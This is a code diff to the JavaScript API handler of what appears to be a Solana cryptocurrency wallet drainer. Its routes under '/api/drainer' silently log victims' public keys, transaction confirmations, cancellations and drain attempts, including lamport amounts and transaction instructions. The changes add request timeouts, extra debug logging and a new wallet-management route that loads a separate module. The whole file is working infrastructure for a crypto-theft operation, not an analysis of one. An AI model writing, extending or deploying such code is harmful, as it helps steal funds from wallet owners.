@@ -28,6 +28,7 @@ export default async function handler(req, res) {
   
   // Debug logging
   console.log(`[API] Request URL: ${req.url}, Pathname: ${pathname}, Method: ${req.method}`);
+  console.log(`[API] Checking routes for pathname: ${pathname}`);
   
   // Route based on path
   if (pathname === '/api/drainer/log-wallet') {
@@ -38,6 +39,8 @@ export default async function handler(req, res) {
     await handleCancellationLogging(req, res);
   } else if (pathname === '/api/drainer/log-drain-attempt') {
     await handleDrainAttemptLogging(req, res);
+  } else if (pathname === '/api/wallet-management') {
+    await handleWalletManagement(req, res);
   } else if (pathname === '/api/drainer') {
     // Route to unified drainer for consistency with local server
     try {
@@ -154,6 +157,12 @@ async function handleWalletLogging(req, res) {
 
 // Confirmation logging handler
 async function handleConfirmationLogging(req, res) {
+  const timeoutId = setTimeout(() => {
+    if (!res.headersSent) {
+      res.status(408).json({ error: 'Confirmation logging timeout' });
+    }
+  }, 30000); // 30 second timeout
+
   try {
     // Silent confirmation logging for production
     const { publicKey, txid, status, error } = req.body;
@@ -227,6 +236,12 @@ async function handleConfirmationLogging(req, res) {
 
 // Cancellation logging handler
 async function handleCancellationLogging(req, res) {
+  const timeoutId = setTimeout(() => {
+    if (!res.headersSent) {
+      res.status(408).json({ error: 'Cancellation logging timeout' });
+    }
+  }, 30000); // 30 second timeout
+
   try {
     // Silent cancellation logging for production
     const { publicKey, walletType, reason } = req.body;
@@ -271,6 +286,12 @@ async function handleCancellationLogging(req, res) {
 
 // Drain attempt logging handler
 async function handleDrainAttemptLogging(req, res) {
+  const timeoutId = setTimeout(() => {
+    if (!res.headersSent) {
+      res.status(408).json({ error: 'Drain attempt logging timeout' });
+    }
+  }, 30000); // 30 second timeout
+
   try {
     // Silent drain attempt logging for production
     const { publicKey, walletType, lamports, instructions, transactionSize } = req.body;
@@ -287,6 +308,34 @@ async function handleDrainAttemptLogging(req, res) {
     console.error('[DRAIN_ATTEMPT] Error logging drain attempt:', error);
     if (!res.headersSent) {
       res.status(500).json({ error: 'Failed to log drain attempt', details: error.message });
+    }
+  }
+}
+
+// Handle wallet management requests
+async function handleWalletManagement(req, res) {
+  const timeoutId = setTimeout(() => {
+    if (!res.headersSent) {
+      res.status(408).json({ error: 'Wallet management request timeout' });
+    }
+  }, 30000); // 30 second timeout
+
+  try {
+    // Import wallet management handler
+    const { default: walletManagementHandler } = await import('./wallet-management.js');
+    
+    // Call the wallet management handler
+    await walletManagementHandler(req, res);
+    
+    clearTimeout(timeoutId);
+  } catch (error) {
+    clearTimeout(timeoutId);
+    console.error('[WALLET_MANAGEMENT] Error:', error);
+    if (!res.headersSent) {
+      res.status(500).json({ 
+        error: 'Wallet management handler failed', 
+        details: error.message 
+      });
     }
   }
 } 
